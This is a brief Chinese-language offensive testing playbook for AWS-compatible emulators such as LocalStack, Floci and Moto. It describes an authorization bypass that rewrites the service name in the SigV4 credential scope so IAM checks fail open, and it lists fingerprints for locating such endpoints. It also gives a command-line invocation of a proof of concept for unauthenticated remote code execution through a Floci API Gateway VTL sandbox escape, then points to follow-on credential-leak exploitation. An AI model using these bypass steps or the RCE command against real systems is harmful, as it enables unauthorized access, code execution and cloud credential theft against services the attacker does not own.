## OSS 化 AWS 兼容端点：LocalStack / Floci / Moto / 自研 SDK 网关

**类级面（无 CVE 也成立）**：`Authorization` 的 SigV4 credential scope 里写了服务名，但路由把请求分给了另一个服务 → **鉴权 fail-open（动作映射不到就放行）**。

探法（每条都存 control/trigger 两份响应）：
1. 拿一个合法/匿名请求，看 `Authorization: AWS4-HMAC-SHA256 Credential=<ak>/<date>/<region>/<service>/aws4_request` 里的 `<service>`
2. 把 `<service>` 改成目标实际业务（如 `gateway`→`iam`、`gateway`→`s3`）重发同一路由
3. 403 → 200，或错误码从 `AccessDenied` 变成业务异常 = **命中**（开了 IAM 强制的实例也能绕）
4. 端点指纹：`4566`（LocalStack/Floci 默认）、`5000`、`/moto-api/`、`X-Amz-*` 回显、`Server: LocalStack`

Floci 的 API Gateway VTL 模板 → 沙箱逃逸 → 未认证 RCE（`poc-db/exploitarium/floci-apigateway-vtl-rce-poc`）：
`python3 poc.py --host <H> --port 4566 --argv sh -c 'id > /tmp/p'`（研究 PoC，本机未复现）。
命中后 → `cloud-credential-leak-exploitation` 定天花板；全 39 条 → `1day-nuclei-kit` 的 `references/exploitarium-pattern-index.md`。

